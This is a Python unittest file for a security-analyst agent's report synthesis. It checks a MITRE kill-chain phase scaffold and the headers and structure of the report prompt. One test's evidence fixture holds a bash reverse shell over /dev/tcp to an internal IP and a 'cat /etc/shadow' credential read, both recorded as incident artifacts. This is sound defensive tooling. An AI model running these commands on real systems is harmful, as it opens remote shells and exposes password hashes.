"""Final-report synthesis: altitude-ordered section skeleton + kill-chain phase scaffold.

The report prompt is restructured into a fact→inference→gap altitude ladder with bare
section headers (so a weak model cannot echo the how-to text into the header line) and a
deterministic kill-chain phase scaffold for the Phase-by-Phase section. See the Report
Readability refactor and project_siem_analyst_loop memory.
"""

from __future__ import annotations

import asyncio
import os
import sys
import unittest

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
project_root = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
sys.path.insert(0, project_root)
import django  # noqa: E402

django.setup()

from langchain_core.messages import AIMessage  # noqa: E402

from agent.runtime.graph.synthesis import (
    _phase_scaffold,
    _synthesize_analyst_report,
)  # noqa: E402


def _run(coro):
    return asyncio.new_event_loop().run_until_complete(coro)


class PhaseScaffoldTest(unittest.TestCase):
    def test_tagged_phase_is_present_and_untagged_core_is_gap(self):
        content = "kill-chain (3 techniques): Initial Access[T1078]; Execution[T1059]"
        scaffold = _phase_scaffold(content)
        self.assertIn("Initial Access: EVIDENCE PRESENT", scaffold)
        self.assertIn("Execution: EVIDENCE PRESENT", scaffold)
        # A core phase with no tag is flagged as a gap to confirm/rule out.
        self.assertIn("Persistence: no MITRE-tagged evidence", scaffold)
        # Phases appear in kill-chain order (Initial Access before Execution).
        self.assertLess(scaffold.index("Initial Access"), scaffold.index("Execution"))

    def test_empty_kill_chain_falls_back_to_facts(self):
        self.assertIn("derive the phase coverage", _phase_scaffold(""))

    def test_phases_named_only_in_the_gaps_clause_are_not_marked_present(self):
        # Regression: a plain `phase in content` test also matched the phase names in
        # the trailing "|| GAPS (...)" clause, so every gap phase was reported as
        # EVIDENCE PRESENT and the scaffold carried no signal at all.
        content = (
            "kill-chain (2 techniques): Reconnaissance[T1595.002 Vuln Scanning×3[ev1]]"
            " || GAPS (core phases with no evidence — investigate or rule out): "
            "Execution, Command and Control, Exfiltration, Impact"
        )
        scaffold = _phase_scaffold(content)
        self.assertIn("Reconnaissance: EVIDENCE PRESENT", scaffold)
        for gap in ("Execution", "Command and Control", "Exfiltration", "Impact"):
            self.assertIn(f"{gap}: no MITRE-tagged evidence", scaffold)
            self.assertNotIn(f"{gap}: EVIDENCE PRESENT", scaffold)

    def test_tagged_phase_carries_its_techniques_and_event_ids(self):
        # The bare "EVIDENCE PRESENT" marker gave the model a claim with nothing behind
        # it, so it wrote the phase off when the facts were all negatives (~368586920).
        content = (
            "kill-chain (2 techniques): Privilege Escalation[T1055 Process Injection"
            "×644[7LzWW_EBT9Fy5_cb48pw], T1548.003 Sudo and Sudo Caching×3"
            "[93U42Z2IP5NGEG-s3apq]]"
        )
        scaffold = _phase_scaffold(content)
        self.assertIn("T1548.003 Sudo and Sudo Caching", scaffold)
        self.assertIn("93U42Z2IP5NGEG-s3apq", scaffold)


class _CapturingModel:
    """Captures the synthesis prompt so we can assert its structure, returns a stub report."""

    def __init__(self):
        self.prompt = ""

    async def ainvoke(self, messages):
        # messages = [SystemMessage, HumanMessage(prompt)]
        self.prompt = messages[-1].content
        return AIMessage(content="## Verdict\nfalse positive; low; contained\n")


class ReportPromptStructureTest(unittest.TestCase):
    def _prompt(self, **over) -> str:
        model = _CapturingModel()
        state = {
            "case_id": "~c",
            "question": "what happened?",
            "agent_name": "investigation",
        }
        kwargs = dict(
            key_findings=["- a finding"],
            facts=[],
            hypotheses=[],
            completed=[],
            report_guardrails="- floor",
            phase_scaffold="- Execution: EVIDENCE PRESENT",
        )
        kwargs.update(over)
        _run(_synthesize_analyst_report(model, state, **kwargs))
        return model.prompt

    def test_board_artifacts_and_correlations_reach_the_prompt(self):
        # Case ~368586920: all of this sat on the board while the report declared
        # Privilege Escalation and Execution "not evidenced". Artifacts and
        # correlations used to reach the narrative only as generic severity advice.
        p = self._prompt(
            board_evidence=[
                'command: [decoded] ["bash", "-c", "0<&196;exec 196<>'
                '/dev/tcp/192.168.130.77/51898"] [qDqTUjp7_4q5yqmXwtAG]',
                "user: phopkins [93U42Z2IP5NGEG-s3apq]",
                "command: /bin/cat /etc/shadow [3kp8gZqt29xgUPf7VD3i]",
                "correlation[data.srcuser phopkins] 5 ev: rule.groups=sudo×3"
                "[93U42Z2IP5NGEG-s3apq]",
            ]
        )
        self.assertIn("/dev/tcp/192.168.130.77/51898", p)
        self.assertIn("user: phopkins", p)
        self.assertIn("/bin/cat /etc/shadow", p)
        self.assertIn("correlation[data.srcuser phopkins]", p)
        # ...and the model is told they are observations it must place in a phase.
        self.assertIn("Artifacts and correlations", p)

    def test_prompt_requires_a_tagged_phase_to_be_dispositioned(self):
        p = self._prompt()
        self.assertIn("EVIDENCE PRESENT must be", p)
        self.assertIn("ACCOUNT FOR EVERY PIECE OF EVIDENCE", p)

    def test_absent_board_evidence_renders_as_none_not_a_crash(self):
        self.assertIn("- (none)", self._prompt(board_evidence=None))

    def test_prompt_lists_the_six_bare_altitude_headers(self):
        p = self._prompt()
        for header in (
            "## Verdict",
            "## Executive Summary",
            "## Confirmed Timeline",
            "## Phase-by-Phase Findings",
            "## Open Gaps",
            "## Recommended Actions",
        ):
            self.assertIn(header, p)
        # The old inline-instruction header form must be gone (the echo bug).
        self.assertNotIn("## Executive Summary — 2-4 sentences", p)
        self.assertNotIn("## Timeline —", p)

    def test_prompt_teaches_altitude_separation_and_carries_scaffold(self):
        p = self._prompt()
        self.assertIn("SEPARATE ALTITUDES", p)
        self.assertIn("ONE REPRESENTATIVE EVENT ID PER CLAIM", p)
        # The deterministic kill-chain scaffold is threaded into the prompt.
        self.assertIn("Execution: EVIDENCE PRESENT", p)


if __name__ == "__main__":
    unittest.main(verbosity=2)
